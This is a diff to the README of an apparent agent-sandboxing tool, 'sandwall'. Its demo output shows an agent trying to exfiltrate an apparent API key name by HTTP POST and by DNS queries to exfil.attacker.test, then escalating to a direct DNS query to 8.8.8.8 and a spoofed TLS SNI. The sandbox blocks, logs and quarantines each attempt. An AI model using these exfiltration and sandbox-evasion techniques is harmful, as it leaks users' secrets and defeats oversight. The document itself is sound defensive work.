@@ -31,8 +31,24 @@ agent: HTTP POST http://10.99.0.1:8080/collect failed: <urlopen error timed out>
 agent: DNS lookup of 4f50454e41495f4150...exfil.attacker.test failed: [Errno -3] Temporary failure in name resolution
 => nothing left the sandbox
 sandwall logs agent --deny-only:
-    10:10:41.874  deny  deny/not_allowed  tcp 10.99.0.1:8080
-    10:10:46.886  dns  refused/not_allowlisted  A 4f50454e41495f4150...exfil.attacker.test.
+    16:39:53.593  deny  deny/not_allowed  tcp 10.99.0.1:8080
+    16:39:58.598  dns  refused/not_allowlisted  A 4f50454e41495f4150...exfil.attacker.test.
+
+== the agent can still do its job
+    curl https://pypi.org/simple/requests/ -> 200
+
+== (c) the agent escalates
+agent: DNS query straight to 8.8.8.8 failed: timed out
+agent: TLS to pypi.org's address with SNI exfil.attacker.test failed: [Errno 104] Connection reset by peer
+sandwall logs agent --deny-only (new lines):
+    16:39:59.734  deny  deny/dns_bypass  udp 8.8.8.8:53
+    16:40:02.771  relay  deny/sni_mismatch  tcp 151.101.192.223:443 sni=exfil.attacker.test
+    16:40:02.803  quarantine  quarantined/auto: 2 x dns_bypass|sni_mismatch|host_mismatch within 1m0s (last: sni_mismatch exfil.attacker.test)
+webhook soc received (signature checked):
+    signature ok   deny/dns_bypass x1
+    signature ok   quarantine/quarantined x1, relay/sni_mismatch x1
+    curl https://pypi.org/simple/requests/ -> 000
+=> quarantined: cut off, kept for forensics (sandwall sandbox release agent)
 ```
 
 ## How it works
@@ -359,7 +375,8 @@ Every e2e script starts and ends with `sandwall nuke`, uses its own state and lo
 The "attacker" endpoint is a local listener in its own netns at `10.99.0.1`, so only the allowlist checks need the internet; the proxy test runs a fake upstream proxy there too.
 VM-mode paths are configurable for keeping snapshots and jails on one (reflink-capable) filesystem: `make e2e-m3 FC_ASSETS=… CHROOT_BASE=… E2E_TMP=…`.
 
-The demos are `demo/exfil.sh` (the comparison above) and `demo/clones.sh` (20 Firecracker clones with a live, merged `sandwall logs -f`).
+The demos are `demo/exfil.sh` (the comparison above) and `demo/clones.sh` (20 Firecracker clones with a live, merged `sandwall logs -f`, one of which is quarantined halfway through while the others carry on).
+Behind an HTTP proxy, run them with `REAL_PROXY=http://host:port`.
 On nested-virtualization hosts, such as a Lima VM on Apple silicon, start many VMs with `vm clone --stagger 1s`; see DECISIONS.md.
 
 ## License
